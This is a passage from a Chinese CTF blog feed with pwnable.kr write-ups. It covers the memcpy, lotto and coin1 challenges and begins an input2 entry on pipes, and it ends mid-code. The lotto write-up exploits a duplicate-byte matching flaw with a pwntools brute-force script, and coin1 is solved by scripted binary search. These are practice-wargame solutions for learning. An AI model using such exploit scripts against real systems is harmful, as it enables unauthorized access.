class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">sh = remote(<span class="string">&#x27;pwnable.kr&#x27;</span>, <span class="number">9022</span>)</span><br><span class="line">chunk_size = [[], [], [], [], [], [], [], [], [], [], []]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>, <span class="number">13</span>):</span><br><span class="line">    <span class="keyword">if</span> i&lt;<span class="number">6</span>:</span><br><span class="line">        chunk_size[i-<span class="number">3</span>].append(<span class="built_in">pow</span>(<span class="number">2</span>,i))</span><br><span class="line">    <span class="keyword">if</span> i &gt;= <span class="number">6</span>:</span><br><span class="line">        <span class="keyword">for</span> size <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">pow</span>(<span class="number">2</span>, i), <span class="built_in">pow</span>(<span class="number">2</span>, i+<span class="number">1</span>)):</span><br><span class="line">            <span class="keyword">if</span> (size-<span class="number">8</span>)%<span class="number">16</span> == <span class="number">0</span>:</span><br><span class="line">                chunk_size[i-<span class="number">3</span>].append(size)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>, <span class="number">13</span>):</span><br><span class="line">    string = <span class="string">&#x27;specify the memcpy amount between &#123;&#125; ~ &#123;&#125; : &#x27;</span>.<span class="built_in">format</span>(<span class="built_in">pow</span>(<span class="number">2</span>,i), <span class="built_in">pow</span>(<span class="number">2</span>,i+<span class="number">1</span>))</span><br><span class="line">    sh.sendlineafter(string, <span class="built_in">str</span>(chunk_size[i-<span class="number">3</span>][<span class="number">0</span>]))</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">3</span>)</span><br><span class="line">log.success(sh.recv())</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/f1shf1sh/Picture/master/Markdown/image-20210212203957532.png"></p><ul><li><p>接收</p><p><img src="https://raw.githubusercontent.com/f1shf1sh/Picture/master/Markdown/image-20210212204107864.png"></p></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;span id=&quot;more&quot;&gt;&lt;/span&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/f1shf1sh/Picture/master/Markdown/image-20210208131853431.png&quot;&gt;    &lt;/</summary>
      
    
    
    
    <category term="ctf" scheme="http://example.com/categories/ctf/"/>
    
    <category term="pwn" scheme="http://example.com/categories/ctf/pwn/"/>
    
    <category term="pwnable.kr" scheme="http://example.com/categories/ctf/pwn/pwnable-kr/"/>
    
    
    <category term="ctf" scheme="http://example.com/tags/ctf/"/>
    
    <category term="wp" scheme="http://example.com/tags/wp/"/>
    
    <category term="pwn" scheme="http://example.com/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>pwnable.kr lotto</title>
    <link href="http://example.com/33592/"/>
    <id>http://example.com/33592/</id>
    <published>2021-07-14T04:44:16.840Z</published>
    <updated>2022-01-01T09:55:26.752Z</updated>
    
    <content type="html"><![CDATA[<span id="more"></span><p><img src="https://raw.githubusercontent.com/f1shf1sh/Picture/master/Markdown/image-20210130221133246.png"></p><p>利用scp命令从服务器下载源码到本地</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scp -P 2222 -r lotto@pwnable.kr: /home/lotto/ /home/fish</span><br></pre></td></tr></table></figure><p>程序源代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> submit[<span class="number">6</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">play</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Submit your 6 lotto bytes : &quot;</span>);</span><br><span class="line">fflush(<span class="built_in">stdout</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> r;</span><br><span class="line">r = read(<span class="number">0</span>, submit, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Lotto Start!\n&quot;</span>);</span><br><span class="line"><span class="comment">//sleep(1);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// generate lotto numbers</span></span><br><span class="line"><span class="keyword">int</span> fd = open(<span class="string">&quot;/dev/urandom&quot;</span>, O_RDONLY);</span><br><span class="line"><span class="keyword">if</span>(fd==<span class="number">-1</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;error. tell admin\n&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> lotto[<span class="number">6</span>];</span><br><span class="line"><span class="keyword">if</span>(read(fd, lotto, <span class="number">6</span>) != <span class="number">6</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;error2. tell admin\n&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;<span class="number">6</span>; i++)&#123;</span><br><span class="line">lotto[i] = (lotto[i] % <span class="number">45</span>) + <span class="number">1</span>;<span class="comment">// 1 ~ 45</span></span><br><span class="line">&#125;</span><br><span class="line">close(fd);</span><br><span class="line"></span><br><span class="line"><span class="comment">// calculate lotto score</span></span><br><span class="line"><span class="keyword">int</span> match = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;<span class="number">6</span>; i++)&#123;</span><br><span class="line"><span class="keyword">for</span>(j=<span class="number">0</span>; j&lt;<span class="number">6</span>; j++)&#123;</span><br><span class="line"><span class="keyword">if</span>(lotto[i] == submit[j])&#123;</span><br><span class="line">match++;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// win!</span></span><br><span class="line"><span class="keyword">if</span>(match == <span class="number">6</span>)&#123;</span><br><span class="line">system(<span class="string">&quot;/bin/cat flag&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;bad luck...\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">help</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;- nLotto Rule -\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;nlotto is consisted with 6 random natural numbers less than 46\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;your goal is to match lotto numbers as many as you can\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;if you win lottery for *1st place*, you will get reward\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;for more details, follow the link below\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;http://www.nlotto.co.kr/counsel.do?method=playerGuide#buying_guide01\n\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;mathematical chance to win this game is known to be 1/8145060.\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">// menu</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> menu;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;- Select Menu -\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;1. Play Lotto\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;2. Help\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;3. Exit\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;menu);</span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span>(menu)&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">play();</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">help();</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;bye\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;invalid menu\n&quot;</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在本地运行程序了解过程，感觉相当于一个猜数游戏，分析程序代码</p><p><img src="https://raw.githubusercontent.com/f1shf1sh/Picture/master/Markdown/image-20210130221629615.png"></p><h4 id="随机数"><a href="#随机数" class="headerlink" title="随机数"></a>随机数</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// generate lotto numbers</span></span><br><span class="line"><span class="keyword">int</span> fd = open(<span class="string">&quot;/dev/urandom&quot;</span>, O_RDONLY);</span><br><span class="line"><span class="keyword">if</span>(fd==<span class="number">-1</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;error. tell admin\n&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> lotto[<span class="number">6</span>];</span><br><span class="line"><span class="keyword">if</span>(read(fd, lotto, <span class="number">6</span>) != <span class="number">6</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;error2. tell admin\n&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;<span class="number">6</span>; i++)&#123;</span><br><span class="line">lotto[i] = (lotto[i] % <span class="number">45</span>) + <span class="number">1</span>;<span class="comment">// 1 ~ 45</span></span><br><span class="line">&#125;</span><br><span class="line">close(fd);</span><br></pre></td></tr></table></figure><p>上面代码意思为生成6个小于等于45的随机数，刚开始我一个urandom和random是一样的伪随机数，但我用c语言写了一个简单的程序后发现并不一样</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> i;</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">int</span> lotto[<span class="number">6</span>];</span><br><span class="line">        <span class="keyword">int</span> fd = open(<span class="string">&quot;/dev/urandom&quot;</span>, O_RDONLY);</span><br><span class="line">        read(fd, lotto, <span class="number">6</span>);</span><br><span class="line">        <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%d, &quot;</span>,lotto[i] % <span class="number">45</span> + <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>生成 a.out文件后运行结果</p><p><img src="https://raw.githubusercontent.com/f1shf1sh/Picture/master/Markdown/image-20210130222234571.png"></p><p>所以这道题并不能使用伪随机的特性来做</p><h4 id="检测"><a href="#检测" class="headerlink" title="检测"></a>检测</h4><p>继续分析下面的检测函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> match = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;<span class="number">6</span>; i++)&#123;</span><br><span class="line"><span class="keyword">for</span>(j=<span class="number">0</span>; j&lt;<span class="number">6</span>; j++)&#123;</span><br><span class="line"><span class="keyword">if</span>(lotto[i] == submit[j])&#123;</span><br><span class="line">match++;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这段代码很有意思，我看第一遍时没想那么多，只是想到了输入的6个字节的顺序不一定要和lotto数组中的数据顺序相同，但是在后面发现这里面存在一个点就是，这没考虑我们输入的6个字节全是一样的情况，可以利用爆破</p><h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><p>这里注意一点细节是我们输入的字节大小需要小于等于45才可以</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">payload = <span class="string">b&#x27;######&#x27;</span></span><br><span class="line">sh = ssh(<span class="string">&#x27;lotto&#x27;</span>, <span class="string">&#x27;pwnable.kr&#x27;</span>, password = <span class="string">&#x27;guest&#x27;</span>, port = <span class="number">2222</span>)</span><br><span class="line">p = sh.process(<span class="string">&#x27;./lotto&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Submit your 6 lotto bytes : &#x27;</span>,payload)</span><br><span class="line">    msg = p.recv()</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;bad luck&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> msg:</span><br><span class="line">        sleep(<span class="number">3</span>)</span><br><span class="line">        log.success(msg)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">p.close()</span><br><span class="line">sh.close()</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/f1shf1sh/Picture/master/Markdown/image-20210130223218226.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;span id=&quot;more&quot;&gt;&lt;/span&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/f1shf1sh/Picture/master/Markdown/image-20210130221133246.png&quot;&gt;&lt;/p&gt;
&lt;</summary>
      
    
    
    
    <category term="ctf" scheme="http://example.com/categories/ctf/"/>
    
    <category term="pwn" scheme="http://example.com/categories/ctf/pwn/"/>
    
    <category term="pwnable.kr" scheme="http://example.com/categories/ctf/pwn/pwnable-kr/"/>
    
    
    <category term="ctf" scheme="http://example.com/tags/ctf/"/>
    
    <category term="wp" scheme="http://example.com/tags/wp/"/>
    
    <category term="pwn" scheme="http://example.com/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>pwnable.kr coin1</title>
    <link href="http://example.com/7286/"/>
    <id>http://example.com/7286/</id>
    <published>2021-07-14T04:44:16.840Z</published>
    <updated>2022-01-01T09:55:02.164Z</updated>
    
    <content type="html"><![CDATA[<span id="more"></span><p><img src="https://raw.githubusercontent.com/f1shf1sh/Picture/master/Markdown/image-20210130223550632.png"></p><p>nc连上去看看</p><p><img src="https://raw.githubusercontent.com/f1shf1sh/Picture/master/Markdown/image-20210130223653659.png"></p><p>一个找假硬币游戏，大概意思为：</p><p>N是硬币个数，C是输入次数，输入相应的硬币下标会给你硬币的重量（图中输入0代表第一个硬币，10是一个真硬币的重量，输入0,1返回20，代表两个真硬币的重量）</p><p>当次数用完时，需要输入假硬币对应的下标，</p><p>整理完过后就是一个题目考察我们的二分查找能力，就是写代码能力，但是这个代码我调试了一会儿。。（太菜了）😔</p><h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><p>脚本里面用到了正则表达式来提取字符串中的数字，参考了这篇文章（<a href="https://www.codenong.com/10365225/">链接</a>）</p><p>因为链接的端口只开放一分钟，我这儿网速有限，就在pwnable.kr的服务器上去运行代码了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">MakeFlat</span>(<span class="params">low, high</span>):</span></span><br><span class="line">    Flat = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    mid = (low + high) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(low, mid):</span><br><span class="line">        Flat += <span class="built_in">str</span>(i) + <span class="string">&#x27; &#x27;</span></span><br><span class="line">    <span class="comment">#log.info(&#x27;[&#x27;+Flat+&#x27;]&#x27;)</span></span><br><span class="line">    <span class="keyword">return</span> Flat</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">BinarySearch</span>(<span class="params">n, c</span>):</span></span><br><span class="line">    low = <span class="number">0</span></span><br><span class="line">    high = n</span><br><span class="line">    correct = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(c):</span><br><span class="line">        mid = (low + high) // <span class="number">2</span></span><br><span class="line">        flat = MakeFlat(low, high)</span><br><span class="line">        sh.sendline(flat)</span><br><span class="line">        p = sh.recv()</span><br><span class="line">        <span class="comment">#log.success(p)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">int</span>(p) == <span class="number">9</span>:</span><br><span class="line">            correct = flat</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">int</span>(p) &lt; (mid - low) * <span class="number">10</span>:</span><br><span class="line">            high = mid</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">int</span>(p) == (mid - low) * <span class="number">10</span>:</span><br><span class="line">            low = mid</span><br><span class="line">        correct = <span class="built_in">str</span>(high - <span class="number">1</span>)</span><br><span class="line">    log.success(<span class="string">&#x27;correct index: &#x27;</span> + correct)</span><br><span class="line">    sh.sendline(correct)</span><br><span class="line">    log.success(sh.recv())</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">N_C</span>():</span></span><br><span class="line">    <span class="comment">#sleep(3)</span></span><br><span class="line">    Flat = sh.recv()</span><br><span class="line">    log.info(Flat)</span><br><span class="line">    ListOfNaC = <span class="built_in">map</span>(<span class="built_in">int</span>, re.findall(<span class="string">&#x27;\d+&#x27;</span>, Flat))</span><br><span class="line">    <span class="keyword">return</span> ListOfNaC</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">    sh = remote(<span class="string">&#x27;pwnable.kr&#x27;</span>, <span class="number">9007</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;\t- Ready? starting in 3 sec... -\n\t\n&#x27;</span>)</span><br><span class="line">    sleep(<span class="number">3</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">        _<span class="built_in">list</span> = N_C()</span><br><span class="line">        BinarySearch(_<span class="built_in">list</span>[<span class="number">0</span>], _<span class="built_in">list</span>[<span class="number">1</span>])</span><br><span class="line">    log.success(sh.recv())</span><br><span class="line">    sh.close()</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/f1shf1sh/Picture/master/Markdown/image-20210130224855930.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;span id=&quot;more&quot;&gt;&lt;/span&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/f1shf1sh/Picture/master/Markdown/image-20210130223550632.png&quot;&gt;&lt;/p&gt;
&lt;</summary>
      
    
    
    
    <category term="ctf" scheme="http://example.com/categories/ctf/"/>
    
    <category term="pwn" scheme="http://example.com/categories/ctf/pwn/"/>
    
    <category term="pwnable.kr" scheme="http://example.com/categories/ctf/pwn/pwnable-kr/"/>
    
    
    <category term="ctf" scheme="http://example.com/tags/ctf/"/>
    
    <category term="wp" scheme="http://example.com/tags/wp/"/>
    
    <category term="pwn" scheme="http://example.com/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>pwnable.kr input2</title>
    <link href="http://example.com/37476/"/>
    <id>http://example.com/37476/</id>
    <published>2021-07-14T04:44:16.840Z</published>
    <updated>2022-01-01T09:55:14.567Z</updated>
    
    <content type="html"><![CDATA[<span id="more"></span><h4 id="read函数"><a href="#read函数" class="headerlink" title="read函数"></a>read函数</h4><p>从文件描述符指向的管道口读入指定字节的字符串到指定的数组中</p><h4 id="write函数"><a href="#write函数" class="headerlink" title="write函数"></a>write函数</h4><p>从指定的数组中写入指定数量的字节到指定的文件描述符指向的管道口</p><p>常见的 三种 0， 1， 2 分别表示标准输入，标准输入，标准错误</p><h4 id="pipe函数"><a href="#pipe函数" class="headerlink" title="pipe函数"></a>pipe函数</h4><h4 id="dup-amp-dup2函数"><a href="#dup-amp-dup2函数" class="headerlink" title="dup&amp;dup2函数"></a>dup&amp;dup2函数</h4><p><img src="https://raw.githubusercontent.com/f1shf1sh/Picture/master/Markdown/20170503111155611.jpg"></p><p>复制一份相同的文件描述符</p><h4 id="fork函数"><a href="#fork函数" class="headerlink" title="fork函数"></a>fork函数</h4><p>在当前父进程创建一个子进程，子进程返回得fpid == 0</p><h4 id="文件描述符"><a href="#文件描述符" class="headerlink" title="文件描述符"></a>文件描述符</h4><p><img src="https://raw.githubusercontent.com/f1shf1sh/Picture/master/Markdown/image-20210124163916045.png"></p><h4 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="keyword">char</span> buffer2[<span class="number">100</span>];</span><br><span class="line">        <span class="keyword">char</span> buffer[] = <span class="string">&quot;Let&#x27;s study pipe!&quot;</span>;</span><br><span class="line">        <span class="keyword">int</span> 